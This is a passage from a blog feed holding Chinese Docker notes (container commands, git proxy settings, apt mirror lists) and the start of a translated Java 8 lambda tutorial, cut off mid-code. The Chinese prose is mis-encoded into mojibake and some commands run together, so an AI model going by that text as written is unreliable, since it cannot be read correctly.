port(s) to the host</td></tr><tr><td><code>--publish-all</code> , <code>-P</code></td><td></td><td>Publish all exposed ports to random ports</td></tr><tr><td><code>--pull</code></td><td><code>missing</code></td><td>Pull image before running (â€œalwaysâ€|â€œmissingâ€|â€œneverâ€)</td></tr><tr><td><code>--read-only</code></td><td></td><td>Mount the containerâ€™s root filesystem as read only</td></tr><tr><td><code>--restart</code></td><td><code>no</code></td><td>Restart policy to apply when a container exits</td></tr><tr><td><code>--rm</code></td><td></td><td>Automatically remove the container when it exits</td></tr><tr><td><code>--runtime</code></td><td></td><td>Runtime to use for this container</td></tr><tr><td><code>--security-opt</code></td><td></td><td>Security Options</td></tr><tr><td><code>--shm-size</code></td><td></td><td>Size of /dev/shm</td></tr><tr><td><code>--sig-proxy</code></td><td><code>true</code></td><td>Proxy received signals to the process</td></tr><tr><td><code>--stop-signal</code></td><td><code>SIGTERM</code></td><td>Signal to stop a container</td></tr><tr><td><code>--stop-timeout</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> Timeout (in seconds) to stop a container</td></tr><tr><td><code>--storage-opt</code></td><td></td><td>Storage driver options for the container</td></tr><tr><td><code>--sysctl</code></td><td></td><td>Sysctl options</td></tr><tr><td><code>--tmpfs</code></td><td></td><td>Mount a tmpfs directory</td></tr><tr><td><code>--tty</code> , <code>-t</code></td><td></td><td>Allocate a pseudo-TTY</td></tr><tr><td><code>--ulimit</code></td><td></td><td>Ulimit options</td></tr><tr><td><code>--user</code> , <code>-u</code></td><td></td><td>Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])</td></tr><tr><td><code>--userns</code></td><td></td><td>User namespace to use</td></tr><tr><td><code>--uts</code></td><td></td><td>UTS namespace to use</td></tr><tr><td><code>--volume</code> , <code>-v</code></td><td></td><td>Bind mount a volume</td></tr><tr><td><code>--volume-driver</code></td><td></td><td>Optional volume driver for the container</td></tr><tr><td><code>--volumes-from</code></td><td></td><td>Mount volumes from the specified container(s)</td></tr><tr><td><code>--workdir</code> , <code>-w</code></td><td></td><td>Working directory inside the container</td></tr></tbody></table>              </div>            </details><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¯åŠ¨å®¹å™¨</span>$ docker <span class="token builtin class-name">exec</span> -it XXID /bin/bash<span class="token comment">#åˆ›é€ å®¹å™¨</span>$ docker run -dit -p <span class="token number">8080</span>:80 -v /e/windowssrc:å®¹å™¨é‡Œæ˜ å°„è·¯å¾„ --name èµ·ä¸ªåå­— ubuntu:ä½ çš„é•œåƒtagï¼ˆé»˜è®¤æ˜¯latestï¼‰<span class="token comment">#åˆ›é€ å®¹å™¨å¹¶è¿è¡Œå¤šä¸ªå‘½ä»¤</span>$ docker run -dit XXX<span class="token punctuation">(</span>images<span class="token punctuation">)</span> /bin/bash -c <span class="token string">"ls &amp;&amp; pwd"</span><span class="token comment">#åˆ é™¤å®¹å™¨</span>$ docker <span class="token function">rm</span> -f XXID<span class="token comment">#æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨å‘½ä»¤å¦‚ä¸‹ï¼š</span>$ docker <span class="token function">ps</span> -a</code></pre></div><h2 id="å®¹å™¨æ‰“åŒ…å¹¶åšæˆé•œåƒ">å®¹å™¨æ‰“åŒ…å¹¶åšæˆé•œåƒ</h2><div class="story post-story"><p><strong>å®¹å™¨æ‰“åŒ…</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker commit containerId dockerUserName/XXX</code></pre><blockquote><p>æ³¨ï¼šcontainerIdä¸ºä½ éœ€è¦ä¸Šä¼ çš„å®¹å™¨idï¼ŒdockerUserNameä¸ºdockerHubçš„ç™»å½•åï¼Œxxxä¸ºä»“åº“å,å½“ç„¶ä¹Ÿä¸ä¸€å®šéå¾—æ˜¯dockerUserName/xxxï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿èµ·è§</p></blockquote><p>æ¥ä¸‹æ¥ä¸ºå­˜åœ¨äºæœ¬åœ°çš„é•œåƒæ‰“æ ‡ç­¾</p><pre class="language-shell" data-language="shell"><code class="language-shell">$ docker tag imageName dockerUserName/xxx<span class="token punctuation">[</span>:tag<span class="token punctuation">]</span><span class="token comment">#æ³¨ï¼šimageNameä¸ºä½ éœ€è¦ä¸Šä¼ çš„é•œåƒnameï¼Œ</span><span class="token comment"># dockerUserNameä¸ºdockerHubçš„ç™»å½•åï¼Œxxxä¸ºä»“åº“åï¼Œå¿…é¡»å’Œä½ åœ¨dockerhubä¸­æ–°å»ºçš„ä»“åº“åç›¸åŒï¼Œtagä¸æŒ‡å®šå°±æ˜¯latest</span></code></pre><p>æ‰“åŒ…å¥½ä¹‹åï¼Œå°±æŠŠæ‰“åŒ…å¥½çš„é•œåƒä¸Šä¼ </p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker push dockerUserName/xxx<span class="token punctuation">[</span>:tag<span class="token punctuation">]</span></code></pre><p>æ³¨ï¼štagä¸æŒ‡å®šå°±æ˜¯latest<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p></div><h2 id="gitè®¾ç½®ã€æŸ¥çœ‹ã€å–æ¶ˆä»£ç†">gitè®¾ç½®ã€æŸ¥çœ‹ã€å–æ¶ˆä»£ç†</h2><div class="story post-story"><p>è®¾ç½®ä»£ç†ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> config --global http.proxy <span class="token string">'socks5://127.0.0.1:1080'</span> $ <span class="token function">git</span> config --global https.proxy <span class="token string">'socks5://127.0.0.1:1080'</span></code></pre><p>æŸ¥çœ‹ä»£ç†ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> config --global --get http.proxy$ <span class="token function">git</span> config --global --get https.proxy</code></pre><p>å–æ¶ˆä»£ç†ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> config --global --unset http.proxygit config --global --unset https.proxy</code></pre></div><h2 id="æ¢æº"><strong>æ¢æº</strong></h2><div class="story post-story"><p>é’ˆå¯¹dockerå®¹å™¨çš„ä»£ç†é…ç½®ï¼š</p><p>åœ¨åˆ›å»º(run)å®¹å™¨çš„æ—¶å€™ï¼ŒåŠ ä¸Š --net=host è¿™ä¸ªé€‰é¡¹ï¼Œå°±å¯ä»¥å®ç°å®¹å™¨å†…å¤–å…±äº«ç½‘ç»œï¼Œç„¶åå†åœ¨å®¹å™¨å†…éƒ¨é…ç½®gitï¼Œå°±å¯ä»¥å®ç°å®¹å™¨å†…ä»£ç†äº†</p><p>Ubuntuç³»ç»Ÿä¸­ï¼Œè½¯ä»¶æºæ–‡ä»¶åœ°å€ä¸ºï¼š<code>/etc/apt/sources.list</code></p><p>1.å¤‡ä»½åŸæ¥çš„æºï¼Œå°†ä»¥å‰çš„æºå¤‡ä»½ä¸€ä¸‹ï¼Œä»¥é˜²ä»¥åå¯ä»¥ç”¨çš„ã€‚</p><pre class="language-none"><code class="language-none">$ sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</code></pre><p>2.æ‰“å¼€/etc/apt/sources.listæ–‡ä»¶ï¼Œåœ¨å‰é¢æ·»åŠ å¦‚ä¸‹æ¡ç›®ï¼Œå¹¶ä¿å­˜ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.listï¼ˆå¯å°†vimæ›´æ¢ä¸ºè‡ªå·±ç†Ÿæ‚‰çš„ç¼–è¾‘å™¨ï¼‰</code></pre><details green><summary> æ·»åŠ æº </summary>              <div class='content'>              <pre class="language-text" data-language="text"><code class="language-text">#æ·»åŠ é˜¿é‡Œæºdeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse#æ·»åŠ æ¸…åæºdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</code></pre>              </div>            </details><p>3.æ›´æ–°</p><p>æ›´æ–°æº</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update</code></pre><p>å¦‚å‡ºç°ä¾èµ–é—®é¢˜ï¼Œè§£å†³æ–¹å¼å¦‚ä¸‹ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> -f <span class="token function">install</span></code></pre><p>æ›´æ–°è½¯ä»¶ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt-get</span> upgrade</code></pre></div><h2 id="ä¿®æ”¹-etc-profile-æ‰“åŒ…åä¸ç”Ÿæ•ˆå¾—é—®é¢˜">ä¿®æ”¹/etc/profile æ‰“åŒ…åä¸ç”Ÿæ•ˆå¾—é—®é¢˜</h2><div class="story post-story"><p>è§£å†³åŠæ³•:</p><p><strong>å¯ä»¥å°†ç¯å¢ƒå˜é‡æ”¾åˆ° <code>/root/.bashrc</code> è¿™ä¸ªé‡Œé¢</strong></p><p>docker å®¹å™¨ä¸­ é»˜è®¤ç”¨æˆ·ä¸º root, å°†ç¯å¢ƒå˜é‡æ”¾åˆ° <code>./bashrc</code> ä¸­</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
            <tag> Docker </tag>
            
            <tag> æ•™ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 Tutorial æ•™ç¨‹</title>
      <link href="/posts/c65d65/"/>
      <url>/posts/c65d65/</url>
      
        <content type="html"><![CDATA[<h1>Java 8 Tutorial æ•™ç¨‹</h1><blockquote><p>ğŸ˜„ @Auther sizaif</p><p>ğŸ“† 2021-05-29  20:41:05</p><p>ğŸ”— ç¿»è¯‘è‡ª <a href="https://winterbe.com/posts/2014/03/16/java-8-tutorial/">https://winterbe.com/posts/2014/03/16/java-8-tutorial/</a></p></blockquote><p>[TOC]</p><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><p>æ¬¢è¿æ¥åˆ°æˆ‘å¯¹Java 8çš„ä»‹ç»ã€‚æœ¬æ•™ç¨‹å°†é€æ­¥æŒ‡å¯¼æ‚¨äº†è§£æ‰€æœ‰æ–°çš„è¯­è¨€ç‰¹æ€§ã€‚åœ¨ç®€çŸ­ç®€å•çš„ä»£ç ç¤ºä¾‹çš„æ”¯æŒä¸‹ï¼Œæ‚¨å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨é»˜è®¤æ¥å£æ–¹æ³•ã€lambdaè¡¨è¾¾å¼ã€æ–¹æ³•å¼•ç”¨å’Œå¯é‡å¤æ³¨é‡Šã€‚åœ¨æœ¬æ–‡çš„æœ€åï¼Œæ‚¨å°†ç†Ÿæ‚‰æœ€æ–°çš„APIå˜åŒ–ï¼Œå¦‚æµã€åŠŸèƒ½æ¥å£ã€åœ°å›¾æ‰©å±•å’Œæ–°çš„æ—¥æœŸAPIã€‚</p></div><h2 id="æ¥å£ç¼ºçœæ–¹æ³•">æ¥å£ç¼ºçœæ–¹æ³•</h2><div class="story post-story"><p>Java 8å…è®¸æˆ‘ä»¬åˆ©ç”¨<code>default</code>å…³é”®å­—å‘æ¥å£æ·»åŠ éæŠ½è±¡çš„æ–¹æ³•å®ç°ã€‚</p><p>æ­¤ç‰¹æ€§ä¹Ÿç§°ä¸ºæ‰©å±•æ–¹æ³•( <strong>Extension Methods</strong>.)ã€‚è¿™æ˜¯ç¬¬ä¸€ä¸ªä¾‹å­:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">Formula</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">double</span> <span class="token function">calculate</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span> <span class="token keyword">double</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>é™¤äº†æŠ½è±¡æ–¹æ³•<code>calculate</code>æ¥å£å¤–ï¼Œ<code>Formula</code>è¿˜å®šä¹‰äº†é»˜è®¤æ–¹æ³•<code>sqrt</code>ã€‚å…·ä½“ç±»åªéœ€å®ç°æŠ½è±¡æ–¹æ³•<code>calculate</code> é»˜è®¤æ–¹æ³•<code>sqrt</code>å¯ä»¥å¼€ç®±å³ç”¨ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Formula</span> formula <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Formula</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">calculate</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>formula<span class="token punctuation">.</span><span class="token function">calculate</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 100.0</span>formula<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 4.0</span></code></pre><p>è¯¥å…¬å¼ä»¥åŒ¿åå¯¹è±¡çš„å½¢å¼å®ç°ã€‚è¿™æ®µä»£ç ç›¸å½“å†—é•¿:6è¡Œä»£ç å°±å¯ä»¥å®Œæˆè¿™æ ·ä¸€ä¸ªç®€å•çš„<code>sqrt(a * 100)</code>è®¡ç®—ã€‚æ­£å¦‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­çœ‹åˆ°çš„ï¼Œåœ¨Java 8ä¸­æœ‰ä¸€ç§æ›´å¥½çš„å®ç°å•ä¸ªæ–¹æ³•å¯¹è±¡çš„æ–¹æ³•ã€‚</p></div><h2 id="æ‹‰å§†è¾¾-Lambda-è¡¨è¾¾å¼">æ‹‰å§†è¾¾(Lambda)è¡¨è¾¾å¼</h2><div class="story post-story"><p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ä¾‹å­å¼€å§‹ï¼Œåœ¨ä»¥å‰çš„Javaç‰ˆæœ¬ä¸­å¦‚ä½•å¯¹å­—ç¬¦ä¸²åˆ—è¡¨æ’åº:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> names <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"peter"</span><span class="token punctuation">,</span> <span class="token string">"anna"</span><span class="token punctuation">,</span> <span class="token string">"mike"</span><span class="token punctuation">,</span> <span class="token string">"xenia"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>names<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">String</span> a<span class="token punctuation">,</span> <span class="token class-name">String</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> b<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é™æ€å®ç”¨æ–¹æ³•<code>Collections.sort</code>æ¥å—ä¸€ä¸ªåˆ—è¡¨å’Œä¸€ä¸ªæ¯”è¾ƒå™¨ï¼Œä»¥ä¾¿å¯¹ç»™å®šåˆ—è¡¨çš„å…ƒç´ è¿›è¡Œæ’åº. æ‚¨ç»å¸¸ä¼šå‘ç°è‡ªå·±åˆ›å»ºäº†åŒ¿åæ¯”è¾ƒå™¨å¹¶å°†å®ƒä»¬ä¼ é€’ç»™sortæ–¹æ³•ã€‚</p><p>Java 8çš„è¯­æ³•è¦çŸ­å¾—å¤šï¼Œè€Œä¸æ˜¯æ•´å¤©åˆ›å»ºåŒ¿åå¯¹è±¡ï¼Œ</p><p><strong>lambda expressions</strong>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>names<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span> a<span class="token punctuation">,</span> <span class="token class-name">String</span> b<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> b<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œä»£ç æ›´çŸ­ï¼Œæ›´å®¹æ˜“é˜…è¯»ã€‚ä½†å®ƒå˜å¾—æ›´çŸ­:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>names<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span> a<span class="token punctuation">,</span> <span class="token class-name">String</span> b<span class="token punctuation">)</span> <span class="token operator">-></span> b<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯¹äºä¸€è¡Œæ–¹æ³•ä¸»ä½“ï¼Œå¯ä»¥è·³è¿‡å¤§æ‹¬å·{}å’Œreturnå…³é”®å­—ã€‚ä½†å®ƒå˜å¾—æ›´çŸ­:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>names<span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-></span> b<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>javaç¼–è¯‘å™¨çŸ¥é“å‚æ•°ç±»å‹ï¼Œæ‰€ä»¥æ‚¨ä¹Ÿå¯ä»¥è·³è¿‡å®ƒä»¬ã€‚è®©æˆ‘ä»¬æ›´æ·±å…¥åœ°äº†è§£lambdaè¡¨è¾¾å¼åœ¨å®é™…ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„</p></div><h2 id="å‡½æ•°å¼æ¥å£">å‡½æ•°å¼æ¥å£</h2><div class="story post-story"><p>lambdaè¡¨è¾¾å¼å¦‚ä½•é€‚åº”javaç±»å‹ç³»ç»Ÿ?æ¯ä¸ªlambdaå¯¹åº”äºç”±æ¥å£æŒ‡å®šçš„ç»™å®šç±»å‹.ä¸€ä¸ªæ‰€è°“çš„å‡½æ•°æ¥å£<code>å¿…é¡»åŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•</code>å£°æ˜ã€‚</p><p>è¯¥ç±»å‹çš„æ¯ä¸ªlambdaè¡¨è¾¾å¼éƒ½å°†ä¸è¿™ä¸ªæŠ½è±¡æ–¹æ³•åŒ¹é…ã€‚ç”±äºé»˜è®¤æ–¹æ³•ä¸æ˜¯æŠ½è±¡çš„ï¼Œæ‚¨å¯ä»¥è‡ªç”±åœ°å°†é»˜è®¤æ–¹æ³•æ·»åŠ åˆ°å‡½æ•°æ¥å£ä¸­ã€‚</p><p>åªè¦æ¥å£åªåŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†ä»»æ„æ¥å£ä½œä¸ºlambdaè¡¨è¾¾å¼ä½¿ç”¨ã€‚ä¸ºäº†ç¡®ä¿æ‚¨çš„æ¥å£æ»¡è¶³éœ€æ±‚ï¼Œæ‚¨åº”è¯¥æ·»åŠ <code>@FunctionalInterface</code>æ³¨é‡Šã€‚ç¼–è¯‘å™¨çŸ¥é“è¿™ä¸ªæ³¨é‡Šï¼Œå½“æ‚¨è¯•å›¾å‘æ¥å£æ·»åŠ ç¬¬äºŒä¸ªæŠ½è±¡æ–¹æ³•å£°æ˜æ—¶ï¼Œå°±ä¼šæŠ›å‡ºç¼–è¯‘å™¨é”™è¯¯ã€‚</p><p>Example:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FunctionalInterface</span><span class="token keyword">interface</span> <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">F</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token class-name">T</span> <span class="token function">convert</span><span class="token punctuation">(</span><span class="token class-name">F</span> from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> converter <span class="token operator">=</span> <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Integer</span> converted <span class="token operator">=</span> converter<span class="token punctuation">.</span><span class="token function">convert</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>converted<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 123</span></code></pre><p>è¯·è®°ä½ï¼Œå¦‚æœ<code>@FunctionalInterface</code>æ³¨é‡Šè¢«çœç•¥ï¼Œé‚£ä¹ˆä»£ç ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚</p></div><h2 id="æ–¹æ³•å’Œæ„é€ å‡½æ•°å¼•ç”¨">æ–¹æ³•å’Œæ„é€ å‡½æ•°å¼•ç”¨</h2><div class="story post-story"><p>é€šè¿‡ä½¿ç”¨é™æ€æ–¹æ³•å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–ä¸Šé¢çš„ç¤ºä¾‹ä»£ç :</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> converter <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">valueOf</span><span class="token punctuation">;</span><span class="token class-name">Integer</span> converted <span class="token operator">=</span> converter<span class="token punctuation">.</span><span class="token function">convert</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>converted<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 123</span></code></pre><p>Java 8å…è®¸æ‚¨é€šè¿‡<code>::</code>å…³é”®å­—ä¼ é€’æ–¹æ³•æˆ–æ„é€ å‡½æ•°çš„å¼•ç”¨ã€‚ä¸Šé¢çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•å¼•ç”¨é™æ€æ–¹æ³•ã€‚ä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥å¼•ç”¨å¯¹è±¡æ–¹æ³•:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Something</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Something</span> something <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Something</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> converter <span class="token operator">=</span> something<span class="token operator">::</span><span class="token function">startsWith</span><span class="token punctuation">;</span><span class="token class-name">String</span> converted <span class="token operator">=</span> converter<span class="token punctuation">.</span><span class="token function">convert</span><span class="token punctuation">(</span><span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>converted<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// "J"</span></code></pre><p>è®©æˆ‘ä»¬çœ‹çœ‹<code>::</code>å…³é”®å­—å¦‚ä½•åœ¨æ„é€ å‡½æ•°ä¸­å·¥ä½œã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¸¦æœ‰ä¸åŒæ„é€ å‡½æ•°çš„ç¤ºä¾‹<code>bean</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> firstName<span class="token punctuation">;</span>    <span class="token class-name">String</span> lastName<span class="token punctuation">;</span>    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">,</span> <span class="token class-name">String</span> lastName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªç”¨äºåˆ›å»ºæ–°äººå‘˜çš„äººå‘˜å·¥å‚æ¥å£:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">PersonFactory</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">P</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span 